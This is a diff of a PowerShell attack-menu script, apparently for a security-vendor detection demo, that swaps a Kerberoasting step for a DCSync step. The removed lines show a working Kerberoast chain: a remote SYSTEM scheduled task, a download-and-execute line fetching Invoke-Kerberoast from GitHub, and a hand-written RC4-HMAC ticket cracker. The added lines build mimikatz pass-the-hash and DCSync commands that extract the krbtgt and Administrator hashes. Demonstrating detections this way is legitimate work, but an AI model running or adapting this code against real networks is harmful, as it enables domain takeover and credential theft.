@@ -1,7 +1,7 @@
 # ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  CrowdStrike NGSIEM + Identity Protection Demo
-#  Version: 5.5.2 (2026-04-03)
+#  Version: 5.6 (2026-04-03)
 #
 #  Attack narrative:
 #    1. Phishing campaign (narrative)
@@ -9,7 +9,7 @@
 #    3. Recon + credential dump on UNMANAGED host (active)
 #    4. Crack demo hash + kerbrute spray (active)
 #    5. Remote dump on DT via WinRM (active - dead end, no DA)
-#    6. Kerberoast on DT + crack TGS hash (active - triggers IDP)
+#    6. DCSync on DC using DA hash (active - triggers IDP)
 #    7. Lateral movement to Ubuntu - cloud detections (active)
 # ============================================================
 
@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.5.2"
+$scriptVersion = "5.6"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -122,7 +122,7 @@ function Show-Menu {
     Write-Host
     Write-Host "================ Identity Attack Demo - Unmanaged Host  [v$scriptVersion] ================" -ForegroundColor Cyan
     Write-Host
-    Write-Host "  Story: phishing > Fortinet exploit > dump unmanaged > crack > remote dump DT > Kerberoast > cloud" -ForegroundColor DarkGray
+    Write-Host "  Story: phishing > Fortinet exploit > dump unmanaged > crack > remote dump DT > DCSync DC > cloud" -ForegroundColor DarkGray
     Write-Host
     Write-Host "  --- Narrative (logs from log generator) ---" -ForegroundColor Yellow
     Write-Host "  1: Phishing Campaign                       [Mimecast spearphishing]"
@@ -134,7 +134,7 @@ function Show-Menu {
     Write-Host
     Write-Host "  --- Lateral Movement (remote via WMIC+SMB) ---" -ForegroundColor Yellow
     Write-Host "  5: Remote Dump on DT                       [mimikatz via WMIC -> find cached DA hash]"
-    Write-Host "  6: Kerberoast on DT + Crack TGS            [Invoke-Kerberoast -> IDP detection on DC]"
+    Write-Host "  6: DCSync on DC                            [PtH as DA -> replicate AD -> krbtgt hash]"
     Write-Host "  7: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 scripts]"
     Write-Host
     Write-Host "  C: Configure IPs" -ForegroundColor DarkGray
@@ -398,7 +398,7 @@ public class CryptoMD4 {
                 "Output is retrieved via SMB admin share (\\DT\C$)."
                 ""
                 "DT has CrowdStrike Falcon in DETECT mode - triggers detections."
-                "Expected result: only local accounts - no domain admin."
+                "After Prep Lab: clark.monroe DA creds are cached - jackpot!"
             ) -Detection "CrowdStrike: LSASS access, credential dump on managed host"
 
             # --- Load credential ---
@@ -491,10 +491,10 @@ public class CryptoMD4 {
                 Write-Host "  [+] Dump saved locally: $idpDir\dt_dump_remote.log" -ForegroundColor Green
 
                 if ($dumpContent -match "clark\.monroe|svc_runbook") {
-                    Write-Host "  [!] Interesting domain account found!" -ForegroundColor Green
+                    Write-Host "  [!] Domain Admin account found! Next: Step 6 - DCSync the DC." -ForegroundColor Green
                 } else {
                     Write-Host "  [-] Only local accounts found - no domain admin cached." -ForegroundColor Yellow
-                    Write-Host "  [-] Dead end. Next: Step 6 - Kerberoast." -ForegroundColor Red
+                    Write-Host "  [-] Run Prep Lab (P) to cache DA creds on DT first." -ForegroundColor Yellow
                 }
             } else {
                 Write-Host "  [!] Dump log not found after ${maxWait}s. Check DT manually." -ForegroundColor Red
@@ -507,324 +507,184 @@ public class CryptoMD4 {
         }
 
         # ================================================================
-        # STEP 6: KERBEROAST ON DT + CRACK TGS (Active - WMIC+SMB)
+        # STEP 6: DCSYNC ATTACK ON DC (Active - PtH + DCSync)
         # ================================================================
         '6' {
-            Show-StepBanner -Step "6" -Title "KERBEROAST ON DT + CRACK TGS HASH" -Lines @(
-                "Local dump on DT was a dead end - no domain admin."
-                "The attacker pivots to KERBEROASTING."
+            Show-StepBanner -Step "6" -Title "DCSYNC ATTACK ON DC" -Lines @(
+                "clark.monroe DA hash found on DT (Step 5) - game over."
                 ""
-                "Kerberoasting requests TGS tickets for service accounts"
-                "with SPNs in Active Directory. The ticket is encrypted"
-                "with the service account password hash - crackable offline."
+                "The attacker uses Pass-the-Hash with the DA hash to"
+                "perform DCSync - replicating the AD database directly"
+                "from the Domain Controller via MS-DRSR protocol."
                 ""
-                "Executed remotely on DT via scheduled task (SYSTEM)."
-                "CrowdStrike IDP detects this pattern on the DC."
-            ) -Detection "CrowdStrike IDP: Kerberoasting / SuspiciousKerberosTicketRequest"
+                "Extracts krbtgt hash = Golden Ticket capability."
+                "This is the 'crown jewels' attack."
+            ) -Detection "CrowdStrike IDP: DCSync / Suspicious Replication Activity"
 
-            # --- Load credential ---
-            $demoPw = $null
-            if (Test-Path "$idpDir\demo_password.txt") {
-                $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
-            } else {
-                $demoPw = Read-Host "  Enter demo password (run Step 4 first)"
-            }
-            if (-not $demoPw) {
-                Write-Host "  [!] No demo password available. Run Step 4 first." -ForegroundColor Red
-                break
-            }
-
-            Write-Host "  [+] Credential: $env:ENV_DT\demo / $demoPw" -ForegroundColor Green
-            Write-Host "  [*] Target: $env:ENV_DT" -ForegroundColor White
-            Write-Host
-
-            # --- Map SMB admin share ---
-            $dtShare = "\\$env:ENV_DT\C$"
-            $dtIdpRemote = "$dtShare\IDP_Files"
-            Write-Host "  [*] Connecting to $dtShare ..." -ForegroundColor White
-            net use $dtShare /user:$env:ENV_DT\demo $demoPw /persistent:no 2>$null | Out-Null
-            if (-not (Test-Path $dtIdpRemote)) {
-                Write-Host "  [!] Cannot access $dtIdpRemote - check admin share access." -ForegroundColor Red
-                break
-            }
-            Write-Host "  [+] SMB connected" -ForegroundColor Green
-            Write-Host
-
-            # --- Write Kerberoast PS1 to DT ---
-            $kerbScript = @'
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$outFile = "C:\IDP_Files\kerberoast_output.txt"
-$hashFile = "C:\IDP_Files\kerberoast_hashes.txt"
-try {
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
-    $results = Invoke-Kerberoast -OutputFormat Hashcat
-    if ($results) {
-        $results | Format-List | Out-File -FilePath $outFile -Encoding ASCII
-        $results | Select-Object -ExpandProperty Hash | Out-File -FilePath $hashFile -Encoding ASCII
-        Add-Content -Path $outFile -Value "`n[SUCCESS] Found $(@($results).Count) service account(s)"
-    } else {
-        "[NO_RESULTS] No SPN accounts found" | Out-File -FilePath $outFile -Encoding ASCII
-    }
-} catch {
-    "[ERROR] $_" | Out-File -FilePath $outFile -Encoding ASCII
-}
-'@
-            $kerbScript | Out-File -FilePath "$dtIdpRemote\run_kerberoast.ps1" -Encoding ASCII
-            Write-Host "  [+] Kerberoast script written to DT" -ForegroundColor Green
-
-            # Clean previous output
-            @("$dtIdpRemote\kerberoast_output.txt", "$dtIdpRemote\kerberoast_hashes.txt") | ForEach-Object {
-                if (Test-Path $_) { Remove-Item $_ -Force }
-            }
-
-            # --- Execute via remote scheduled task as SYSTEM ---
-            # SYSTEM on domain-joined DT authenticates to AD as the computer account
-            Write-Host "  [*] Creating scheduled task on DT (runs as SYSTEM for domain access)..." -ForegroundColor White
-            Write-Host "  [*] This triggers IDP detection on the DC." -ForegroundColor Yellow
-            $taskName = "IDP_Kerberoast"
-            $taskCmd = "powershell.exe -ep bypass -file C:\IDP_Files\run_kerberoast.ps1"
-
-            # Delete any existing task
-            schtasks /delete /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /f 2>$null | Out-Null
-
-            # Create task as SYSTEM
-            $createResult = schtasks /create /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /tr $taskCmd /sc once /st 00:00 /ru SYSTEM /f 2>&1
-            if ($LASTEXITCODE -ne 0) {
-                Write-Host "  [!] Failed to create scheduled task: $createResult" -ForegroundColor Red
-                break
-            }
-            Write-Host "  [+] Task created. Running..." -ForegroundColor Green
-
-            # Run the task
-            schtasks /run /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName 2>&1 | Out-Null
-            Write-Host "  [*] Task launched. Waiting for results..." -ForegroundColor White
-
-            # --- Wait for output (force SMB cache refresh) ---
-            $maxWait = 45
-            $waited = 0
-            $kerbFound = $false
-            while ($waited -lt $maxWait) {
-                Start-Sleep -Seconds 3
-                $waited += 3
-                $dirCheck = cmd.exe /c "dir `"$dtIdpRemote\kerberoast_output.txt`" 2>nul" | Out-String
-                if ($dirCheck -match "kerberoast_output\.txt") {
-                    $kerbFound = $true
-                    Start-Sleep -Seconds 2
+            # --- Get clark.monroe hash ---
+            $clarkHash = Get-ClarkHash
+            if (-not $clarkHash) {
+                Write-Host "  [!] clark.monroe hash not found." -ForegroundColor Red
+                Write-Host "  [*] Run Step 5 first, or enter manually." -ForegroundColor Yellow
+                $manualClark = Read-Host "  clark.monroe NTLM hash (32 hex)"
+                if ($manualClark -match '^[0-9a-fA-F]{32}$') {
+                    $manualClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
+                    $clarkHash = $manualClark
+                } else {
+                    Write-Host "  [!] Invalid hash." -ForegroundColor Red
                     break
                 }
-                Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
             }
 
-            # --- Retrieve results ---
-            if ($kerbFound -or (Test-Path "$dtIdpRemote\kerberoast_output.txt")) {
-                $kerbOutput = Get-Content "$dtIdpRemote\kerberoast_output.txt" -Raw -ErrorAction SilentlyContinue
-                if (-not $kerbOutput) {
-                    $kerbOutput = cmd.exe /c "type `"$dtIdpRemote\kerberoast_output.txt`"" | Out-String
-                }
-                Write-Host
-                Write-Host "  === Kerberoast Results ===" -ForegroundColor Yellow
-                Write-Host $kerbOutput -ForegroundColor Gray
-                Write-Host
+            Write-Host "  [+] clark.monroe DA hash: $clarkHash" -ForegroundColor Green
+            Write-Host "  [*] Target DC: $env:ENV_DC_IP ($env:ENV_DOMAIN)" -ForegroundColor White
+            Write-Host
 
-                if ($kerbOutput -match "\[SUCCESS\]") {
-                    Write-Host "  [+] Kerberoast SUCCESS!" -ForegroundColor Green
+            # --- Step 6a: Write DCSync batch ---
+            Write-Host "  --- 6a: Creating DCSync script ---" -ForegroundColor Yellow
+            $dcsyncBat = "$idpDir\dcsync_cmd.bat"
+            $dcsyncLog = "C:\IDP_Files\dcsync_output.log"
 
-                    # Copy hashes locally
-                    if (Test-Path "$dtIdpRemote\kerberoast_hashes.txt") {
-                        Copy-Item "$dtIdpRemote\kerberoast_hashes.txt" "$idpDir\kerberoast_hashes.txt" -Force
-                        Write-Host "  [+] TGS hashes copied to $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
-                        Write-Host
+            $sb2 = New-Object System.Text.StringBuilder
+            [void]$sb2.AppendLine('@echo off')
+            [void]$sb2.AppendLine('echo [*] DCSync attack - replicating AD via MS-DRSR...')
+            [void]$sb2.Append('echo [*] Target: ')
+            [void]$sb2.Append($env:ENV_DOMAIN)
+            [void]$sb2.Append(' (DC: ')
+            [void]$sb2.Append($env:ENV_DC_IP)
+            [void]$sb2.AppendLine(')')
+            [void]$sb2.AppendLine('echo.')
+            # mimikatz command: debug + log + dcsync krbtgt + dcsync Administrator + exit
+            [void]$sb2.Append('"C:\IDP_Files\Mimikatz\x64\mimikatz.exe" "privilege::debug" "log ')
+            [void]$sb2.Append($dcsyncLog)
+            [void]$sb2.Append('" "lsadump::dcsync /domain:')
+            [void]$sb2.Append($env:ENV_DOMAIN)
+            [void]$sb2.Append(' /dc:')
+            [void]$sb2.Append($env:ENV_DC_IP)
+            [void]$sb2.Append(' /user:krbtgt" "lsadump::dcsync /domain:')
+            [void]$sb2.Append($env:ENV_DOMAIN)
+            [void]$sb2.Append(' /dc:')
+            [void]$sb2.Append($env:ENV_DC_IP)
+            [void]$sb2.AppendLine(' /user:Administrator" "exit"')
+            [void]$sb2.AppendLine('echo.')
+            [void]$sb2.AppendLine('echo [+] DCSync complete. Output saved.')
+            [void]$sb2.AppendLine('pause')
+            [System.IO.File]::WriteAllText($dcsyncBat, $sb2.ToString(), [System.Text.Encoding]::ASCII)
+            Write-Host "  [+] DCSync batch written" -ForegroundColor Green
 
-                        # --- Crack TGS hash ---
-                        Write-Host "  ===========================================" -ForegroundColor DarkGray
-                        Write-Host "  Cracking TGS hash" -ForegroundColor Yellow
-                        Write-Host "  ===========================================" -ForegroundColor DarkGray
-                        Write-Host
+            # --- Wrapper batch (single path, no spaces for /run:) ---
+            $dcsyncWrapper = "$idpDir\pth_dcsync.bat"
+            [System.IO.File]::WriteAllText($dcsyncWrapper, "@cmd.exe /c `"$dcsyncBat`"`r`n", [System.Text.Encoding]::ASCII)
 
-                        # Check if hashcat is available
-                        $hashcatPath = $null
-                        # Search common locations
-                        $hashcatSearchPaths = @(
-                            "$idpDir\hashcat.exe"
-                            "$idpDir\hashcat-6.2.6\hashcat.exe"
-                        )
-                        # Also check any hashcat-* subdirectory
-                        Get-ChildItem -Path $idpDir -Directory -Filter "hashcat*" -ErrorAction SilentlyContinue | ForEach-Object {
-                            $hashcatSearchPaths += "$($_.FullName)\hashcat.exe"
-                        }
-                        foreach ($hp in $hashcatSearchPaths) {
-                            if (-not $hashcatPath -and (Test-Path $hp)) { $hashcatPath = $hp }
-                        }
-                        if (-not $hashcatPath -and (Get-Command "hashcat.exe" -ErrorAction SilentlyContinue)) { $hashcatPath = "hashcat.exe" }
+            # Clean previous output
+            if (Test-Path $dcsyncLog) { Remove-Item $dcsyncLog -Force }
 
-                        if ($hashcatPath) {
-                            Write-Host "  [+] hashcat found: $hashcatPath" -ForegroundColor Green
-                            Write-Host "  [*] Cracking TGS with wordlist..." -ForegroundColor White
-                            try {
-                                $hashcatProc = Start-Process -FilePath $hashcatPath `
-                                    -ArgumentList "-m 13100 `"$idpDir\kerberoast_hashes.txt`" `"$wordlistFile`" --force --potfile-disable -o `"$idpDir\kerberoast_cracked.txt`"" `
-                                    -NoNewWindow -Wait -PassThru
-                                if (Test-Path "$idpDir\kerberoast_cracked.txt") {
-                                    $cracked = Get-Content "$idpDir\kerberoast_cracked.txt"
-                                    Write-Host "  [+] CRACKED!" -ForegroundColor Green
-                                    $cracked | ForEach-Object { Write-Host "  $_" -ForegroundColor Green }
-                                } else {
-                                    Write-Host "  [-] hashcat finished but no cracks (exit: $($hashcatProc.ExitCode))." -ForegroundColor Yellow
-                                }
-                            } catch {
-                                Write-Host "  [!] hashcat error: $_" -ForegroundColor Red
-                            }
-                        } else {
-                            # --- Pure PowerShell TGS cracker (etype 23 / RC4-HMAC) ---
-                            Write-Host "  [-] hashcat not found. Using built-in PowerShell cracker..." -ForegroundColor Yellow
-                            Write-Host
+            # --- Step 6b: PtH launcher ---
+            Write-Host "  --- 6b: Pass-the-Hash as clark.monroe ---" -ForegroundColor Yellow
+            $pthLauncher = "$idpDir\launch_dcsync.bat"
+            $sb = New-Object System.Text.StringBuilder
+            [void]$sb.AppendLine('@echo off')
+            [void]$sb.AppendLine('echo [*] PtH as clark.monroe DA - launching DCSync...')
+            [void]$sb.AppendLine('echo.')
+            [void]$sb.Append('"')
+            [void]$sb.Append($mimiExe)
+            [void]$sb.Append('" "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:')
+            [void]$sb.Append($env:ENV_DOMAIN)
+            [void]$sb.Append(' /ntlm:')
+            [void]$sb.Append($clarkHash)
+            [void]$sb.Append(' /run:')
+            [void]$sb.Append($dcsyncWrapper)
+            [void]$sb.AppendLine('" "exit"')
+            [System.IO.File]::WriteAllText($pthLauncher, $sb.ToString(), [System.Text.Encoding]::ASCII)
+            Write-Host "  [+] PtH launcher written" -ForegroundColor Green
+            Write-Host
 
-                            $hashLine = (Get-Content "$idpDir\kerberoast_hashes.txt" -First 1).Trim()
-                            if ($hashLine -match '\$krb5tgs\$23\$\*[^*]+\*\$([A-Fa-f0-9]{32})\$([A-Fa-f0-9]+)') {
-                                $checksumHex = $Matches[1]
-                                $edata2Hex = $Matches[2]
-                            } else {
-                                Write-Host "  [!] Could not parse TGS hash format." -ForegroundColor Red
+            Write-Host "  [*] This will:" -ForegroundColor White
+            Write-Host "    1. PtH as clark.monroe (DA) via mimikatz" -ForegroundColor Gray
+            Write-Host "    2. DCSync krbtgt + Administrator from DC" -ForegroundColor Gray
+            Write-Host "    3. Save output to dcsync_output.log" -ForegroundColor Gray
+            Write-Host
+            Write-Host "  [!] TRIGGERS: CrowdStrike IDP DCSync detection on DC" -ForegroundColor Red
+            Write-Host
+
+            $doSync = Read-Host "  Launch DCSync? (Y/n)"
+            if ($doSync -ne 'n') {
+                try {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$pthLauncher`""
+                    Write-Host
+                    Write-Host "  [+] DCSync launched in new window." -ForegroundColor Green
+                    Write-Host "  [*] Waiting for results..." -ForegroundColor White
+
+                    # --- Wait for output file ---
+                    $maxWait = 60
+                    $waited = 0
+                    $syncFound = $false
+                    while ($waited -lt $maxWait) {
+                        Start-Sleep -Seconds 3
+                        $waited += 3
+                        if (Test-Path $dcsyncLog) {
+                            # Check if mimikatz finished writing (file should contain "exit")
+                            $peek = Get-Content $dcsyncLog -Raw -ErrorAction SilentlyContinue
+                            if ($peek -and ($peek -match "Hash NTLM" -or $peek.Length -gt 500)) {
+                                Start-Sleep -Seconds 3
+                                $syncFound = $true
                                 break
                             }
-
-                            # Hex to bytes helper
-                            function Convert-HexToBytes([string]$hex) {
-                                $bytes = New-Object byte[] ($hex.Length / 2)
-                                for ($i = 0; $i -lt $hex.Length; $i += 2) {
-                                    $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
-                                }
-                                return ,$bytes
-                            }
-
-                            # RC4 cipher
-                            function Invoke-RC4([byte[]]$key, [byte[]]$data) {
-                                $S = New-Object int[] 256
-                                for ($i = 0; $i -lt 256; $i++) { $S[$i] = $i }
-                                $j = 0
-                                for ($i = 0; $i -lt 256; $i++) {
-                                    $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
-                                    $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp
-                                }
-                                $i = 0; $j = 0
-                                $result = New-Object byte[] $data.Length
-                                for ($k = 0; $k -lt $data.Length; $k++) {
-                                    $i = ($i + 1) % 256
-                                    $j = ($j + $S[$i]) % 256
-                                    $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp
-                                    $result[$k] = $data[$k] -bxor $S[($S[$i] + $S[$j]) % 256]
-                                }
-                                return ,$result
-                            }
-
-                            $checksumBytes = Convert-HexToBytes $checksumHex
-                            $edata2Bytes = Convert-HexToBytes $edata2Hex
-
-                            # Ensure MD4 type is loaded (from Step 4)
-                            Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class CryptoMD4TGS {
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptDestroyHash(IntPtr hHash);
-    [DllImport("advapi32.dll", SetLastError=true)]
-    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
-    public static byte[] ComputeMD4Bytes(byte[] data) {
-        IntPtr hProv = IntPtr.Zero; IntPtr hHash = IntPtr.Zero;
-        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
-        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
-        CryptHashData(hHash, data, (uint)data.Length, 0);
-        byte[] hash = new byte[16]; uint len = 16;
-        CryptGetHashParam(hHash, 2, hash, ref len, 0);
-        CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
-        return hash;
-    }
-}
-"@ -ErrorAction SilentlyContinue
-
-                            $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
-                            Write-Host "  [*] Cracking TGS (etype 23 / RC4-HMAC) with $($wordlist.Count) passwords..." -ForegroundColor White
-                            $startTime = Get-Date
-                            $crackedTGS = $null
-                            $attempts = 0
-                            $msgType = [byte[]](2,0,0,0)
-
-                            foreach ($pw in $wordlist) {
-                                $attempts++
-                                try {
-                                    # 1. NTLM hash = MD4(UTF-16LE(password))
-                                    $pwBytes = [System.Text.Encoding]::Unicode.GetBytes($pw)
-                                    $ntlm = [CryptoMD4TGS]::ComputeMD4Bytes($pwBytes)
-
-                                    # 2. K1 = HMAC-MD5(NTLM, msg_type=2)
-                                    $hmac1 = New-Object System.Security.Cryptography.HMACMD5
-                                    $hmac1.Key = $ntlm
-                                    $K1 = $hmac1.ComputeHash($msgType)
-
-                                    # 3. K3 = HMAC-MD5(K1, checksum)
-                                    $hmac3 = New-Object System.Security.Cryptography.HMACMD5
-                                    $hmac3.Key = $K1
-                                    $K3 = $hmac3.ComputeHash($checksumBytes)
-
-                                    # 4. RC4 decrypt edata2
-                                    $decrypted = Invoke-RC4 -key $K3 -data $edata2Bytes
-
-                                    # 5. Verify: HMAC-MD5(K1, decrypted[16:]) should equal decrypted[0:16]
-                                    $hmacV = New-Object System.Security.Cryptography.HMACMD5
-                                    $hmacV.Key = $K1
-                                    $plaintext = $decrypted[16..($decrypted.Length - 1)]
-                                    $expected = $hmacV.ComputeHash($plaintext)
-
-                                    $match = $true
-                                    for ($i = 0; $i -lt 16; $i++) {
-                                        if ($decrypted[$i] -ne $expected[$i]) { $match = $false; break }
-                                    }
-
-                                    if ($match) {
-                                        $crackedTGS = $pw
-                                        break
-                                    }
-                                } catch { }
-                                if ($attempts % 10 -eq 0) { Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray }
-                            }
-
-                            $elapsed = ((Get-Date) - $startTime).TotalSeconds
-                            if ($crackedTGS) {
-                                Write-Host "  [+] CRACKED! Service account password: $crackedTGS" -ForegroundColor Green
-                                Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
-                                $crackedTGS | Out-File -FilePath "$idpDir\kerberoast_cracked.txt" -Encoding ASCII
-                                Write-Host "  [+] Saved to $idpDir\kerberoast_cracked.txt" -ForegroundColor Green
-                            } else {
-                                Write-Host "  [-] Exhausted wordlist ($attempts passwords) in $([math]::Round($elapsed,2))s." -ForegroundColor Yellow
-                                Write-Host "  [*] Password not in wordlist. Try a larger dictionary." -ForegroundColor White
-                            }
                         }
+                        Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
                     }
-                } elseif ($kerbOutput -match "\[NO_RESULTS\]") {
-                    Write-Host "  [!] No SPN accounts found in the domain." -ForegroundColor Red
-                    Write-Host
-                    Write-Host "  Pre-requisite: register an SPN for a service account on the DC:" -ForegroundColor Yellow
-                    Write-Host "    setspn -A MSSQLSvc/warp-duck-DT.$($env:ENV_DOMAIN):1433 svc_runbook" -ForegroundColor Gray
-                } else {
-                    Write-Host "  [!] Kerberoast may have failed. Check output above." -ForegroundColor Red
+
+                    if ($syncFound -or (Test-Path $dcsyncLog)) {
+                        $dcsyncContent = Get-Content $dcsyncLog -Raw -ErrorAction SilentlyContinue
+                        if (-not $dcsyncContent) {
+                            $dcsyncContent = cmd.exe /c "type `"$dcsyncLog`"" | Out-String
+                        }
+                        Write-Host
+                        Write-Host "  === DCSync Results ===" -ForegroundColor Yellow
+                        Write-Host $dcsyncContent -ForegroundColor Gray
+                        Write-Host
+
+                        # Save locally
+                        $dcsyncContent | Out-File -FilePath "$idpDir\dcsync_results.log" -Encoding ASCII
+                        Write-Host "  [+] Full results saved: $idpDir\dcsync_results.log" -ForegroundColor Green
+
+                        # Extract krbtgt hash
+                        if ($dcsyncContent -match "(?s)Object RDN\s*:\s*krbtgt.*?Hash NTLM:\s*([0-9a-fA-F]{32})") {
+                            $krbtgtHash = $Matches[1]
+                            Write-Host
+                            Write-Host "  ========================================" -ForegroundColor Red
+                            Write-Host "  [!!!] KRBTGT HASH EXTRACTED" -ForegroundColor Red
+                            Write-Host "  [!!!] $krbtgtHash" -ForegroundColor Red
+                            Write-Host "  [!!!] Golden Ticket capability achieved" -ForegroundColor Red
+                            Write-Host "  ========================================" -ForegroundColor Red
+                            $krbtgtHash | Out-File -FilePath "$idpDir\krbtgt_hash.txt" -Encoding ASCII
+                        }
+
+                        # Extract Administrator hash
+                        if ($dcsyncContent -match "(?s)Object RDN\s*:\s*Administrator.*?Hash NTLM:\s*([0-9a-fA-F]{32})") {
+                            $adminHash = $Matches[1]
+                            Write-Host "  [+] Administrator NTLM: $adminHash" -ForegroundColor Green
+                            $adminHash | Out-File -FilePath "$idpDir\admin_hash.txt" -Encoding ASCII
+                        }
+
+                        if ($dcsyncContent -notmatch "Hash NTLM") {
+                            Write-Host "  [-] No hashes found in output. DCSync may have failed." -ForegroundColor Yellow
+                            Write-Host "  [*] Check the DCSync window for errors." -ForegroundColor Yellow
+                        }
+                    } else {
+                        Write-Host "  [!] No output after ${maxWait}s." -ForegroundColor Red
+                        Write-Host "  [*] Check the DCSync window for errors." -ForegroundColor Yellow
+                        Write-Host "  [*] Ensure DC ($env:ENV_DC_IP) is reachable on RPC ports." -ForegroundColor Yellow
+                    }
+                } catch {
+                    Write-Host "  [!] Error launching DCSync: $_" -ForegroundColor Red
                 }
-            } else {
-                Write-Host "  [!] No output after ${maxWait}s. PowerShell may have been blocked on DT." -ForegroundColor Red
-                Write-Host "  [*] Check if Defender blocked the script on DT." -ForegroundColor Yellow
             }
 
-            # Cleanup
-            schtasks /delete /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /f 2>$null | Out-Null
-            Remove-Item "$dtIdpRemote\run_kerberoast.ps1" -Force -ErrorAction SilentlyContinue
-            net use $dtShare /delete /y 2>$null | Out-Null
+            # Cleanup temp files (keep results)
+            Remove-Item $dcsyncBat -Force -ErrorAction SilentlyContinue
+            Remove-Item $dcsyncWrapper -Force -ErrorAction SilentlyContinue
+            Remove-Item $pthLauncher -Force -ErrorAction SilentlyContinue
             Write-Host
         }
 
